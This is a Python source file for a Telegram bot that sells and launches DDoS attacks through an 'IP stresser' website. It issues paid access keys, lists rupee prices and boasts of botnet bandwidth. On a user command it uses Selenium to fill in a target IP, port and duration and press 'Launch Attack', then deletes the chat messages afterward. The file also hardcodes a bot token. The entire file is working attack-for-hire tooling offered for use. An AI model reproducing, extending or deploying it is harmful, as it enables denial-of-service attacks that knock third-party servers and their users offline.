# auto_stress_advanced_v6_full.py
# Save and run: python3 auto_stress_advanced_v6_full.py

import re
import sqlite3
import time
import threading
import random
import string
from telebot import TeleBot
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
BOT_TOKEN = "8514551314:AAFD36VoK5EMwFBlc0v9y2VX2ddo3pgPSzE"
ADMIN_IDS = [8434238157]               # Add more admin IDs here if needed

WEBSITE_URL = "https://satellitestress.st/attack"

bot = TeleBot(BOT_TOKEN)

# ────────────────────────────────────────────────
# DATABASE SETUP
# ────────────────────────────────────────────────
conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY, type TEXT, expiry INTEGER, max_uses INTEGER,
                  remaining_uses INTEGER, max_seconds INTEGER)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS state
                 (key TEXT PRIMARY KEY, value TEXT)''')

conn.commit()

lock = threading.Lock()

def db_get(key, default=None):
    with lock:
        cursor.execute("SELECT value FROM state WHERE key=?", (key,))
        row = cursor.fetchone()
        return row[0] if row else default

def db_set(key, value):
    with lock:
        cursor.execute("INSERT OR REPLACE INTO state (key, value) VALUES (?, ?)", (key, value))
        conn.commit()

# ────────────────────────────────────────────────
# GLOBAL ATTACK LOCK
# ────────────────────────────────────────────────
current_attack_end = 0

def is_attack_running():
    global current_attack_end
    if current_attack_end > time.time():
        return True, int(current_attack_end - time.time())
    current_attack_end = 0
    db_set("attack_end", "0")
    return False, 0

def start_attack_lock(duration):
    global current_attack_end
    current_attack_end = time.time() + duration
    db_set("attack_end", str(current_attack_end))

# ────────────────────────────────────────────────
# KEY & UTILITY FUNCTIONS
# ────────────────────────────────────────────────
def generate_key(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def create_key(key_type="normal", days=7, uses=1, max_sec=300):
    key = generate_key()
    expiry = int(time.time()) + (days * 86400)
    with lock:
        cursor.execute(
            "INSERT INTO keys (key, type, expiry, max_uses, remaining_uses, max_seconds) VALUES (?,?,?,?,?,?)",
            (key, key_type, expiry, uses, uses, max_sec)
        )
        conn.commit()
    return key

def claim_key(user_id, key_str):
    with lock:
        cursor.execute("SELECT * FROM keys WHERE key=?", (key_str,))
        row = cursor.fetchone()
        if not row:
            return False, "❌ Invalid or wrong key!"
        k, typ, exp, maxu, rem, maxs = row
        if exp < time.time():
            return False, "⌛ This key has expired!"
        if rem <= 0:
            return False, "⛔ No uses remaining!"
        cursor.execute("UPDATE keys SET remaining_uses = remaining_uses - 1 WHERE key=?", (key_str,))
        conn.commit()
        db_set(f"user_{user_id}_keytype", typ)
        db_set(f"user_{user_id}_maxsec", str(maxs))
        return True, f"🎉 *Key activated successfully!*\nType: *{typ}*\nMax seconds per attack: *{maxs}s*"

# ────────────────────────────────────────────────
# SHARED ATTACK FUNCTION (with countdown + double delete)
# ────────────────────────────────────────────────
def perform_attack(message, ip, port, duration, cmd_type="hello"):
    user_id = message.from_user.id
    keytype = db_get(f"user_{user_id}_keytype") or "none"
    max_sec = int(db_get(f"user_{user_id}_maxsec") or 300)

    if keytype == "none":
        bot.reply_to(message, "🔑 *You need an active key!*\nUse: `/claim <your_key>`")
        return

    if duration > max_sec:
        bot.reply_to(message, f"⚠️ *Your key allows max {max_sec}s per attack!*")
        return

    running, rem = is_attack_running()
    if running:
        bot.reply_to(message, f"⏳ *Another attack is running!*\nPlease wait *{rem} seconds*...")
        return

    try:
        options = Options()
        options.debugger_address = "127.0.0.1:9222"
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 20)

        driver.get(WEBSITE_URL)
        wait.until(EC.presence_of_element_located(
            (By.XPATH, "//input[@placeholder='104.29.138.132' or @placeholder='80' or @placeholder='60']")
        ))

        driver.find_element(By.XPATH, "//input[@placeholder='104.29.138.132']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='104.29.138.132']").send_keys(ip)
        driver.find_element(By.XPATH, "//input[@placeholder='80']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='80']").send_keys(port)
        driver.find_element(By.XPATH, "//input[@placeholder='60']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='60']").send_keys(str(duration))

        launch_btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[contains(text(),'Launch Attack')]")
        ))
        launch_btn.click()

        start_attack_lock(duration)

        # Attack start message
        msg = bot.send_message(
            message.chat.id,
            f"🔥 *{cmd_type.upper()} ATTACK LAUNCHED!* 🔥\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱ Duration: *{duration} seconds*",
            parse_mode='Markdown'
        )

        # Countdown thread
        def countdown():
            for i in range(duration, 0, -10):
                time.sleep(10)
                try:
                    bot.edit_message_text(
                        f"🔥 *Attack in progress* ({cmd_type})\n"
                        f"🎯 `{ip}:{port}`\n"
                        f"⏳ *{i} seconds remaining...*",
                        msg.chat.id, msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass

            try:
                bot.edit_message_text(
                    f"✅ *Attack completed successfully!*\n"
                    f"🎯 `{ip}:{port}` ({duration}s)",
                    msg.chat.id, msg.message_id,
                    parse_mode='Markdown'
                )
                time.sleep(6)

                # Delete bot's final message
                bot.delete_message(msg.chat.id, msg.message_id)
                # Delete user's original command message
                bot.delete_message(message.chat.id, message.message_id)

            except Exception as e:
                print("Cleanup error:", e)

            global current_attack_end
            current_attack_end = 0

        threading.Thread(target=countdown, daemon=True).start()

    except Exception as e:
        bot.reply_to(message, f"❌ *Error during attack:*\n{str(e)}", parse_mode='Markdown')

# ────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def cmd_start(message):
    text = (
        "🌟 *Welcome to SATELLITESTRESS BOT* 🌟\n\n"
        "⚡ *Fastest & Cheapest IP Stresser on Telegram* ⚡\n"
        "Servers: Singapore • Europe • Maharashtra • France\n"
        "Bandwidth: *6 TB* capable\n\n"
        "🚀 *How to begin:*\n"
        "1. Buy key from @admin\n"
        "2. Activate → `/claim YOURKEY`\n"
        "3. Launch → `/hello IP PORT TIME`\n\n"
        "📋 Type `/help` or `/cmd` for all commands\n"
        "💰 Type `/price` to see plans\n\n"
        "🔥 *Stay powerful – attack smarter!* 🔥"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['help', 'cmd'])
def cmd_help_cmd(message):
    text = (
        "📋 *All Commands & How to Use*\n\n"
        "• `/start` → Welcome & info\n"
        "• `/hello IP PORT SECONDS` → Normal attack\n"
        "• `/minecraft IP PORT SECONDS` → Premium only\n"
        "• `/domain IP PORT SECONDS` → Premium only\n"
        "• `/claim <key>` → Activate your key\n"
        "• `/price` → View all plans & prices\n"
        "• `/tutorial` → Step-by-step guide\n"
        "• `/speed` → Server & network info\n"
        "• `/help` or `/cmd` → This list\n"
        "• `/uptime` → Bot status\n\n"
        "🔐 *Premium keys* unlock `/minecraft` & `/domain`\n"
        "Custom time (600s/1200s) → contact @admin"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['price'])
def cmd_price(message):
    text = (
        "💰 *Pricing Plans* 💰\n\n"
        "*Normal Plan* (only /hello):\n"
        "• 1 Day   → ₹70\n"
        "• 2 Days  → ₹130\n"
        "• 3 Days  → ₹200\n"
        "• 1 Week  → ₹400\n"
        "• 1 Month → ₹900\n"
        "• Season   → ₹1500\n\n"
        "*Premium Plan* (/hello + /minecraft + /domain):\n"
        "• 1 Day   → ₹90\n"
        "• 2 Days  → ₹150\n"
        "• 3 Days  → ₹250\n"
        "• 1 Week  → ₹460\n"
        "• 1 Month → ₹1100\n\n"
        "Default limit: *300 seconds*\n"
        "Want *600s or 1200s*? → Custom premium → contact @admin\n\n"
        "Cheapest in whole Telegram 🔥"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['tutorial'])
def cmd_tutorial(message):
    text = (
        "📚 *Quick Tutorial*\n\n"
        "1. Get your key from @admin\n"
        "2. Activate it → `/claim YOURKEY`\n"
        "3. Launch attack:\n"
        "   `/hello IP PORT SECONDS`\n"
        "   or premium: `/minecraft` / `/domain`\n\n"
        "• Countdown updates every 10 seconds\n"
        "• Messages auto-delete after finish\n"
        "• Only one attack at a time (global lock)\n\n"
        "Enjoy the power! ⚡"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['speed'])
def cmd_speed(message):
    text = (
        "🌐 *Network & Speed Info* 🌐\n\n"
        "• Bandwidth: *6 TB* capable\n"
        "• Split Servers:\n"
        "  Singapore\n"
        "  Europe\n"
        "  Maharashtra (India)\n"
        "  France\n\n"
        "Lowest latency routing – real botnet power ⚡"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

# Attack commands (hello / minecraft / domain)
@bot.message_handler(commands=['hello', 'minecraft', 'domain'])
def attack_commands(message):
    cmd = message.text.split()[0][1:]
    args = message.text.split()

    if len(args) == 1:
        if cmd == "hello":
            bot.reply_to(message, "Usage: `/hello <IP> <PORT> <SECONDS>`\nExample: `/hello 1.2.3.4 80 120`", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"Usage: `/{cmd} <IP> <PORT> <SECONDS>`\nExample: `/{cmd} 1.2.3.4 25565 300`", parse_mode='Markdown')
        return

    if len(args) != 4:
        bot.reply_to(message, "Wrong format. Need IP PORT SECONDS")
        return

    _, ip, port, dur_str = args
    try:
        duration = int(dur_str)
    except:
        bot.reply_to(message, "Seconds must be a number!")
        return

    user_id = message.from_user.id
    keytype = db_get(f"user_{user_id}_keytype") or "none"

    if cmd in ["minecraft", "domain"] and keytype != "premium":
        bot.reply_to(message, f"❌ `/{cmd}` requires *premium key* only.")
        return

    perform_attack(message, ip, port, duration, cmd)

# ────────────────────────────────────────────────
# ADMIN COMMANDS (genkey, genpremium, etc.)
# ────────────────────────────────────────────────

@bot.message_handler(commands=['genkey'])
def cmd_genkey(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Admin only command.")
        return
    args = message.text.split()
    if len(args) == 1:
        bot.reply_to(message, "Usage: `/genkey <days> <uses>`\nExample: `/genkey 7 3`", parse_mode='Markdown')
        return
    try:
        days = int(args[1])
        uses = int(args[2])
        key = create_key("normal", days, uses, 300)
        bot.reply_to(message, f"Normal key created:\n`{key}`\nDays: {days} | Uses: {uses} | Max 300s")
    except:
        bot.reply_to(message, "Invalid numbers. Use: `/genkey days uses`", parse_mode='Markdown')

@bot.message_handler(commands=['genpremium'])
def cmd_genpremium(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Admin only.")
        return
    args = message.text.split()
    if len(args) == 1:
        bot.reply_to(message, "Usage: `/genpremium <days> <uses> <max_seconds>`\nExample: `/genpremium 30 1 600`", parse_mode='Markdown')
        return
    try:
        days = int(args[1])
        uses = int(args[2])
        maxsec = int(args[3])
        key = create_key("premium", days, uses, maxsec)
        bot.reply_to(message, f"Premium key created:\n`{key}`\nDays: {days} | Uses: {uses} | Max {maxsec}s")
    except:
        bot.reply_to(message, "Invalid format.", parse_mode='Markdown')

@bot.message_handler(commands=['claim'])
def cmd_claim(message):
    args = message.text.split()
    if len(args) == 1:
        bot.reply_to(message, "Usage: `/claim <your_key_here>`", parse_mode='Markdown')
        return
    key = args[1]
    success, msg = claim_key(message.from_user.id, key)
    bot.reply_to(message, msg, parse_mode='Markdown')

# Fake commands (optional)
@bot.message_handler(commands=['uptime'])
def cmd_uptime(message):
    bot.reply_to(message, "Bot is online and running since script start ⚡")

print("Bot v6 full version started – emoji + bold + countdown + double delete")

bot.infinity_polling()
